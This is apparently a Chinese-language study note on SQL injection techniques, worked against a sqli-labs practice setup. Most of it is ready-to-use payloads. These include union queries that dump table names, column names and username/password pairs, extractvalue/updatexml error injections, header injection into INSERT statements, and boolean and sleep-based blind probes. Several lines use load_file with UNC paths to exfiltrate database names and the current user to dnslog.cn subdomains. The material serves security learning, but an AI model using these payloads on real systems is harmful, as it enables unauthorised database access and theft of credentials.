## SQL注入

>   -   s
>
>   >   -   联合注入
>   >   -   报错注入
>   >   -   盲注
>   >
>   >   >   -   布尔盲注
>   >   >   -   时间盲注
>
>   -   http请求包注入点
>
>   >   -   ua注入：insert into
>   >   -    referer
>   >   -   cookie
>   >   -   xff
>
>   -   宽字节注入
>
>   >   -   数据库使用gbk编码
>   >   -   输入一个单引号ʻ  ——》/'       / 转义
>   >   -   /'   %5c%27
>   >   -    %df'  ——》   %df%5c%27
>
>   -   堆叠注入
>
>   >   -   提前结束语句
>   >   -   堆叠可以执行任意sql语句
>
>   -   dnslog外带注入
>
>   >   -   没有回显、访问过多会被ban（IP被封）
>   >   -   针对于攻防   考虑是否存在安全设备
>   >   -   目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为： \servername\sharename\directory\filename。
>   >   -   secure_file_priv状态为空
>   >
>   >   ```
>   >   secure_file_priv为null	表示不允许导入导出
>   >   secure_file_priv为指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹
>   >   secure_file_priv没有设置的时候，则表示没有任何限制
>   >   ```
>   >
>   >   -   load_file()   可以访问unc路径
>   >   -   DNSLog：http://www.dnslog.cn/
>   >   -    http://192.168.157.129/sql-labs/Less-1/?id=1'and(select load_file(concat('\\\\', (selecthex(user()))--+

```
select * from users where username='admin' and password='';

联合注入：
猜解数据库名：id=-1' union select 1,2,database()--+

猜解表名：id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security') --+

猜解字段名：id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users') --+

爆出数据：id=-1' union select 1,2,(select concat(username,'~',password) from security.users limit 0,1)--+

报错注入：
id=-1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))--+


id=-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)--+

id=-1' and gtid_subset(user(),1)--+
1' and if(1=1,exp(709),0)--+


1、判断是否存在sql注入：字符型（'" ''' ''''周期性变化）、数字型（1/1、1/0）

2、构造基础语句
思考一个问题，为什么直接采用and，不使用or
1' and 1=1 --+  正确的语句
1' and 1=2 --+  错误的语句

3、轮子构造出来之后，需要进行变形
1’ and if(1=1,1,0)=1 --+ 正确的语句
1’ and if(1=1,1,0)=0 --+ 错误的语句

4、继续向下构造
1‘ and if(substr('12',1,1)='1',1,0)=1 --+ 正确的语句
1‘ and if(substr('12',1,1)='2',1,0)=1 --+ 错误的语句

5、最终语句
1‘ and if(substr(user(),1,1)='a',1,0)=1 --+


id=1'+and+if(mid(user(),1,1)='a',1,0)=1--+
id=1'+and+if(length(user()=1,sleep(3),sleep(1)))--+
id=1'+and+if(mid(user(),1,1)='a',exp(709),exp(999))--+  

dnslog外带：
http://127.0.0.1/sqli/Less-1/?iid=1' and (select+load_file(concat('\\\\',(select+database()),'.im3o5g.dnslog.cn/abc')))--+

INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)

INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('1',1,updatexml(1,concat(0x7e,(select database()),0x7e),1))#', '$IP', $uname)

1, 1,extractvalue(1,concat(0x7e,database(),0x7e)))# 

INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (''and extractvalue(1,concat(0x7e,database(),0x7e)) and '', '$IP', $uname)

'extractvalue(1,concat(0x7e,database(),0x7e))' 字符

1', 1,extractvalue(1,concat(0x7e,database(),0x7e)))# 
'and extractvalue(1,concat(0x7e,database(),0x7e)) and '

INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')

'and extractvalue(1,concat(0x7e,database(),0x7e)) and '

www.baidu.com
baidu.com

abc.jmzj4b.dnslog.cn


\\Kiki77\新建文件夹

1' and (select load_file(concat('\\\\',(select hex(user())),'.jmzj4b.dnslog.cn/abc')))--+

\\security.jmzj4b.dnslog.cn/abc
```

